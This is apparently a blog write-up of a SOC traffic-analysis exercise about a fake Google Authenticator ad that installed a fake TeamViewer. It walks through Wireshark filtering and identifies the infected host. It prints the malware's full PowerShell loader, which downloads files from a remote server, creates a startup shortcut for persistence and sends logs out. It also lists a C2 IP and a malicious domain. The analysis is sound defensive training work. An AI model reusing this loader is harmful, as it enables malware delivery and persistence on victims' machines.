---
title: Traffic Analysis Exercise (Download from fake software site)
date: 2025-02-22 12:57:00 +3
categories: SOC
tags: [Network Traffic Analysis, Wireshark, Network Forensics]
image: 
  path: /assets/img/SoftwareDownload.JPG
---

On January 22, 2025, an employee reported to Fictional Corp’s Security Operations Center (SOC) that a coworker downloaded a suspicious file. A Bing search for the Google Authenticator application was done and they clicked on the malicious ad which led them to a malicious website where the fake software was installed. After the malware was executed on the victim’s machine, from the network traffic analysis it was observed that it would download other files to the machine. The malware also exhibited persistence capabilities by adding itself to the startup programs folder ensuring that it runs every time the system boots up. Despite no observable malicious actions to date, its presence poses a significant potential threat to the organization.

## LAN Segment Details from the PCAP

* LAN segment range:  **10.1.17[.]0/24**   (**10.1.17[.]0** through **10.1.17[.]255**)
* Domain:  **bluemoontuesday[.]com**
* Active Directory (AD) domain controller:  **10.1.17[.]2** - **WIN-GSH54QLW48D**
* AD environment name:  **BLUEMOONTUESDAY**
* LAN segment gateway:  **10.1.17[.]1**
* LAN segment broadcast address:  **10.1.17[.]255**

## Network Traffic analysis process 
This section describes the steps taken in the network traffic analysis, my thought process, and how I reviewed the traffic to find the IoCs that were shared by the Threat Intelligence source, Palo Alto Networks. It most definitely made this process much easier, so let's dive in!

Considering that the incident involved visiting a malicious website, it was logical to start by filtering the packets for DNS traffic. I identified one of the subdomains used for the malicious ads, i.e., `google-authenticator.burleson-appliance.net/`.

![Alt Text](/assets/img/DFS1.JPG)

The next step involved filtering for HTTP requests in order to check for the fake software that was installed and other files that were pulled from the network when it was executed on the victim's machine. From the screenshot below, we can see `TeamViewer.exe`, `pas.ps1`, `29842.ps1`, and many others which were retrieved.

![Alt Text](/assets/img/DFS2.JPG)

In the screenshot below, it shows when I followed the TCP stream of the highlighted packets, and the more I scrolled down, I identified more files that were being pulled into the victim's machine. It's how I found `29842.ps1`.

![Alt Text](/assets/img/DFS3.JPG)

I also got to see the script that was used to install the fake TeamViewer application. This shows us the behavior of the fake software once it gets to the victim's machine. To summarize what it does, the script downloads and executes files (i.e., `TeamViewer.exe`, `Teamviewer_Resource_fr.dll`, `TV.dll`, and `pas.ps1` files) from a remote server; these are initial actions the fake software takes to establish itself in the victim's machine. It also created a shortcut in the startup folder so that it can run every time the system starts. This is a way in which attackers ensure persistence in the system. The script also sends logs to a remote server, which indicates that the fake software might be communicating with an external attacker, potentially sending sensitive data or receiving commands. This summary provides a behavior analysis of the fake software.

```javascript
function Download-Files($panelIP, $files, $filesDir){
    $web = New-Object System.Net.WebClient
    
    try {
        if(!(Test-Path $filesDir)) {
            New-Item $filesDir -ItemType Directory | Out-Null
        }
    } catch {
        return @{'status' = 'error'; 'message' = 'error while creating startup directory'}
    }
    
    foreach($file in $files) {
        try {
            $link = $file.link
            $fileName = $file.name
            $filePath = "$filesDir\$($file.name)"
            $web.DownloadFile($link, $filePath)
            if($fileName -eq $startupFile){
                $exePath = $startupFile
            }
        } catch {
            return @{'status' = 'error'; 'message' = "Error while download file. Filename: $($file.name). Link: $($link). Error: $($Error[0].exception.message)"}
        }
    }


    return @{'status' = 'success'}
}


function Create-Shortcut($filePath, $shortCutpath){
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortCutpath)
    $Shortcut.TargetPath = $filePath
    $Shortcut.Save()
}


function Invoke-Startup($panelIP, $files, $filesDir, $startupFileName){
    $result = Download-Files $panelIP $files $filesDir
    if ($result.status -eq 'error'){
        return $result
    }


    #$startupFilePath = "$filesDir\$startupFileName"
    $startupFilePath = "C:\ProgramData\huo\TeamViewer.exe"
    $shortcutPath = "$([Environment]::GetFolderPath('Startup'))\TeamViewer.lnk"


    try {
        Create-Shortcut $startupFilePath $shortcutPath
    } catch {
        return @{'status' = 'error'; 'message' = "Error while creating shortcut."}
    }


    return @{'status' = 'success'; 'message' = 'startup shortcut created'}
}


function Send-Log($result){
    $log = "?k=$result"
    $uploadUrl = $url + $log
    $web = New-Object System.Net.WebClient
    $web.DownloadString($uploadUrl)
}


function ConvertTo-StringData($hashTable){
        foreach ($item in $hashTable) {
            foreach ($entry in $item.GetEnumerator()) {
                "{0} = {1}; " -f $entry.Key, $entry.Value
            }
        }
}


$filesDownloadLink = $ip + 'api/file/get-file/'
$filesDir = 'C:\ProgramData\huo'
$files = @(
    @{'name' = 'TeamViewer.exe'; 'link' = $filesDownloadLink + 'TeamViewer'},
    @{'name' = 'Teamviewer_Resource_fr.dll'; 'link' = $filesDownloadLink + 'Teamviewer_Resource_fr'},
    @{'name' = 'TV.dll'; 'link' = $filesDownloadLink + 'TV'}
    @{'name' = 'pas.ps1'; 'link' = $filesDownloadLink + 'pas.ps1'}
)
$startupFile = 'TeamViewer.exe'


$result = Invoke-Startup $panelIP $files $filesDir $startupFile
$result = ConvertTo-StringData($result)
Send-Log($result)p, li { white-space: pre-wrap; }hr { height: 1px; border-width: 0; }li.unchecked::marker { content: "\2610"; }li.checked::marker { content: "\2612"; }
```

I also took note of the server that supported the downloads: `5.252.153.241`.

![Alt Text](/assets/img/DFS4.JPG)

The following screenshots show an alternative method of finding more files that were retrieved from the malicious server. From the previous step, we already identified the IP address of the server hosting the malicious ad; hence, filtering the packets by specifying its IP address when filtering for HTTP requests can be useful in narrowing the traffic down to find much more valuable traffic.

![Alt Text](/assets/img/DFS5.JPG)

![Alt Text](/assets/img/DFS6.JPG)

## Questions 

**What is the IP address of the infected Windows client?** `10.1.17.215` 
At the start, when we filtered for DNS traffic, the IP that visited one of the malicious ad's subdomains is the infected Windows client.

![Alt Text](/assets/img/DFS7.JPG)

**What is the mac address of the infected Windows client?** `Intel_26:4a:74 (00:d0:b7:26:4a:74)`
This information was obtained from the very same packet from the previous question. The screenshot below shows its details where I got the MAC address.

![Alt Text](/assets/img/DFS8.JPG)

**What is the host name of the infected Windows client?** `DESKTOP-L8C5GSJ`
Since I already knew the IP address of the affected machine, I used it to filter the packets to display NBNS packets associated with the infected Windows client.

![Alt Text](/assets/img/DFS9.JPG)

![Alt Text](/assets/img/DFS10.JPG)

**What is the user account name from the infected Windows client?** `shutchenson`
I searched for Kerberos authentication, which is used by AD DC, to see if I could find packets that would reveal the user account name. I selected the first packet and viewed its details and got `shutchenson`.

![Alt Text](/assets/img/DFS11.JPG)

**What is the likely domain name for the fake Google Authenticator page?**
From a previous DNS filtered search, I found a subdomain which is also listed as one of the main website's subdomains that could likely be the Google Authenticator page.

![Alt Text](/assets/img/DFS12.JPG)



